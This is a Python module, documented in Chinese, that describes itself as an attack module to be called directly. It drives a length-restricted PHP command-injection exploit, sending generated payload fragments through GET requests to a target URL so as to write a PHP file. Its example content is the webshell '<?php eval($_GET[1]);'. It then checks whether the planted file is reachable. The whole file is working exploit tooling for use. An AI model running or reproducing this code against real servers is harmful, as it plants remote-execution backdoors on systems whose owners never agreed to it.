"""
攻击模块, 可以直接调用该模块的方法进行攻击
"""

import requests
import time
from tqdm import tqdm
from .payloads_generator import get_php_payload_7, get_php_payload_5
from common import INFO_SUCCESS, INFO_FAIL, INFO_START


def exploit_payload_get(
    url: str,
    args: str,
    target_command: str,
    target_php_file_name: str,
    n: int,
):
    """
    ### GET请求通用的破解模块
    - url: 目标的URL地址, 只需要传入普通的url即可, 无需后续参数. 比如: `https://host:port/`
    - args: 可选的参数, 会加在链接的后面. 不过必须存在{{0}}作为标识. 比如: `?cmd={{0}}`
    - target_command: 需要写入php的内容. 比如: `<?php eval($_GET[1]);`
    - target_php_file_name: 写入文件的文件名. 比如: `1.php`
    - n: 长度限制, 支持: 5, 7
    """
    full_url = url + args
    print(INFO_START)

    # 构建payload
    payload = None
    if n == 7:
        payload = get_php_payload_7(target_command, target_php_file_name)
    elif n == 5:
        payload = get_php_payload_5(target_command, target_php_file_name)

    # NOTE 开始攻击模块
    for i in tqdm(payload):
        requests.get(full_url.format(i.strip()))
        time.sleep(1)

    test = requests.get(f"{url}/{target_php_file_name}")
    if test.status_code == requests.codes.ok:
        print(INFO_SUCCESS)
    else:
        print(INFO_FAIL)
